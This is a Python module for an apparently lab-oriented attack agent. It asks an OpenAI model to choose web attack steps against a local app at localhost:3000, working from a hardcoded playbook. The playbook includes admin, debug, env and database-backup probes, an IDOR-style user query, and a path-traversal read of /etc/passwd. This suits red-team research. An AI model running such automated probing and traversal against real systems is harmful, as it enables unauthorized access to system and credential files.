from __future__ import annotations

import json
import os
from pathlib import Path
from typing import Dict, List

from openai import OpenAI

from .schemas import Action, coerce_action

PROMPT_PATH = Path(__file__).resolve().parents[1] / "prompts" / "system_planner.txt"
MODEL_NAME = os.getenv("OPENAI_ATTACK_MODEL", "gpt-4o-mini")
client = OpenAI()

BASE_URL = "http://localhost:3000"
ATTACK_PLAYBOOK = [
    "GET /",
    "GET /signup",
    "GET /login",
    "POST /signup",
    "POST /login",
    "GET /dashboard",
    "GET /dashboard?user=sofia@example.com",
    "GET /admin",
    "GET /debug",
    "GET /env",
    "GET /source?file=app.js",
    "GET /config-prod",
    "GET /backup-db",
    "GET /admin-v2",
    "GET /download-db",
    "GET /download-db?file=../../../../etc/passwd",
    "GET /download-db?file=users.db",
    "GET /public/js/app.js",
]


def _collect_output_text(result) -> str:
    if hasattr(result, "choices"):
        choice = result.choices[0]
        content = choice.message.get("content") if isinstance(choice.message, dict) else choice.message.content
        if isinstance(content, list):
            return "\n".join(part.get("text", "") for part in content if isinstance(part, dict))
        return content or ""
    return ""


def _normalize_url(url: str) -> str:
    if not url:
        return f"{BASE_URL}/"
    if url.startswith("http://") or url.startswith("https://"):
        return url
    if not url.startswith("/"):
        url = "/" + url
    return f"{BASE_URL}{url}"


def _needs_variation(memory: Dict[str, List[str]], url: str) -> bool:
    normalized = _normalize_url(url)
    recent = [_normalize_url(item) for item in memory.get("recent_actions", []) or []]
    if len(recent) < 2:
        return False
    return all(entry == normalized for entry in recent[-2:])


def _candidate_targets(memory: Dict[str, List[str]]) -> List[str]:
    candidates: List[str] = []
    for link in memory.get("next_steps", []) or []:
        candidates.append(_normalize_url(link))
    for entry in ATTACK_PLAYBOOK:
        verb, path = entry.split(" ", 1)
        if verb.upper() == "GET":
            candidates.append(_normalize_url(path.strip()))
    unique: List[str] = []
    seen = set()
    for target in candidates:
        if target not in seen:
            seen.add(target)
            unique.append(target)
    return unique


def _fallback_action(memory: Dict[str, List[str]]) -> Action:
    visited = set(memory.get("visited", []))
    for target in _candidate_targets(memory):
        normalized = _normalize_url(target)
        if normalized not in visited:
            return Action("GET", normalized, {}, "Fallback diversification: probing unvisited endpoint.")
    return Action("GET", _normalize_url("/"), {}, "Fallback recon sweep.")


def _enforce_strategy(action: Action, memory: Dict[str, List[str]]) -> Action:
    normalized = _normalize_url(action.target_url)
    if _needs_variation(memory, normalized):
        return _fallback_action(memory)

    visited = set(memory.get("visited", []))
    if normalized in visited:
        fallback = _fallback_action(memory)
        if _normalize_url(fallback.target_url) != normalized:
            return fallback
    return action


def choose_action(memory: Dict[str, List[str]]) -> Dict[str, object]:
    """Ask the planner LLM for the next attack action."""

    system_prompt = PROMPT_PATH.read_text().strip()
    payload = json.dumps(
        {
            "memory": memory,
            "attack_playbook": ATTACK_PLAYBOOK,
        },
        ensure_ascii=False,
    )

    result = client.chat.completions.create(
        model=MODEL_NAME,
        temperature=0.4,
        messages=[
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": payload},
        ],
    )

    response_text = _collect_output_text(result).strip()

    try:
        action_data = json.loads(response_text)
    except json.JSONDecodeError:
        start = response_text.find("{")
        end = response_text.rfind("}")
        if start >= 0 and end > start:
            try:
                action_data = json.loads(response_text[start : end + 1])
            except json.JSONDecodeError:
                action_data = {}
        else:
            action_data = {}

    action = coerce_action(action_data)
    action = _enforce_strategy(action, memory)
    return action.to_dict()
